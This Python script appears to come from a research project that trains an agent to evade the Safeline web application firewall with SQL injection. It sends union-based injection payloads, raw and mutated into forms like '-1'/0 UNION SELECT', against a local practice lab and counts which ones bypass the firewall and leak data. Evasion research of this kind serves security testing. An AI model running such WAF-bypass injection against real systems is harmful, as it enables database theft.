"""
tools/probe_div_break.py
========================
PRE-CHECK (HTTP — run in WSL) before spending hours retraining on Safeline.

Question it answers: does the `/0` (div_break) operator — alone or with
dot_prefix — let a STILL-VALID union payload BOTH pass Safeline (non-403)
AND return the exfiltration marker? If even these hand-built variants score
0 SUCCESS, the RL retraining is pointless. If some SUCCEED, retraining is
worth it (a reachable reward now exists).

For each payload we probe 3 variants:
  raw          : original (control)
  div          : div_break(p)             -> -1'/0 UNION SELECT ...
  dot+div      : div_break(dot_prefix(p)) -> .1-1'/0 UNION SELECT ...

USAGE:
  python3 -m tools.probe_div_break --url "http://localhost:8888/Less-1/"
  python3 -m tools.probe_div_break --url "http://localhost:8888/Less-1/" --limit 30
"""
import argparse
import csv
import collections

from seqsqli.builder import build_target_from_args
from seqsqli.core.http import send_request
from seqsqli.core.response import classify_response
from seqsqli.core.mutations import MutationEngine as M


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--param", default="id")
    ap.add_argument("--payloads", default="payloads_union_less1.csv")
    ap.add_argument("--limit", type=int, default=0, help="probe only first N payloads (0=all)")
    args = ap.parse_args()

    target = build_target_from_args(args.url, args.param, "GET")
    rows = list(csv.DictReader(open(args.payloads, newline="")))
    if args.limit:
        rows = rows[: args.limit]

    variants = {
        "raw":     lambda p: p,
        "div":     M.div_break,
        "dot+div": lambda p: M.div_break(M.dot_prefix(p)),
    }
    stats = {k: collections.Counter() for k in variants}
    successes = {k: [] for k in variants}

    for r in rows:
        base = r["payload"]
        for name, fn in variants.items():
            mutated = fn(base)
            resp_text, status = send_request(target, mutated)
            result = classify_response(
                resp_text, status, signal_type="union", strict_markers=True,
            )
            stats[name][result] += 1
            stats[name][f"http{status}"] += 1
            if result == "SUCCESS":
                successes[name].append((r["payload_id"], mutated[:160]))

    print(f"\nProbed {len(rows)} payloads x 3 variants vs {args.url}\n")
    for name in variants:
        s = stats[name]
        n_succ = s.get("SUCCESS", 0)
        n_err  = s.get("SQL_ERROR", 0)
        n_blk  = s.get("WAF_BLOCKED", 0)
        n_200  = s.get("http200", 0)
        n_403  = s.get("http403", 0)
        print(f"[{name:8}] SUCCESS={n_succ:3}  SQL_ERROR={n_err:3}  WAF_BLOCKED={n_blk:3}"
              f"   | http200={n_200} http403={n_403}")
    print()
    for name in variants:
        if successes[name]:
            print(f"== {name} SUCCESS examples ==")
            for pid, pl in successes[name][:5]:
                print(f"   {pid}: {pl}")
    if not any(successes[v] for v in variants):
        print("==> 0 SUCCESS across all variants. div_break alone does NOT enable "
              "marker exfiltration through Safeline -> retraining unlikely to help.")


if __name__ == "__main__":
    main()
